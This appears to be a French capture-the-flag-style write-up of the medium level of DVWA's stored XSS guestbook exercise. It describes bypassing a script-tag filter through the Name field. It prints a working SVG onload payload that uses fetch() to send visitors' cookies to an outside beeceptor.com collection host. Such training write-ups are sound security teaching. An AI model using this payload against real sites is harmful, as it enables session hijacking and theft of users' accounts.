# Niveau "Medium"

Pas de changement sur notre guestbook :

![](../../../../.gitbook/assets/5076ad0022975412aaf350b2d4bead8d.png)

Il n'est pas possible ici d'exécuter une popup `alert()` simplement. En effet, les balises `<script>` `</script>` semblent être filtrées et le champ "Message" semble également échapper le caractère `"""` \(et donc sans doute également le caractère `"'"`\) :

![](../../../../.gitbook/assets/c7e438ccbf248c8c155dcf0f1fdfc9b5.png)

Nous allons nous concentrer sur le champ "Name" étant donné qu'il semble être plus permissif. On tente tout d'abord de passer par une autre balise afin d'exécuter notre javascript :

![](../../../../.gitbook/assets/409fda59350b4afebe9c56e088498d79.png)

Cela fonctionne. Il nous reste plus qu'à étoffer notre payload afin de récupérer les cookies des visiteurs :

```markup
<svg onload="fetch('https://dvwaxssrefl.free.beeceptor.com?cookie=' + document.cookie);">
```

![](../../../../.gitbook/assets/cac83dca6e4bade94123fd6517923bbc.png)

Notre attaque fonctionne, le cookie du visiteur est envoyé sur notre serveur malicieux :

![](../../../../.gitbook/assets/979b4817a9f54ad7338b9a12e0bcc474.png)

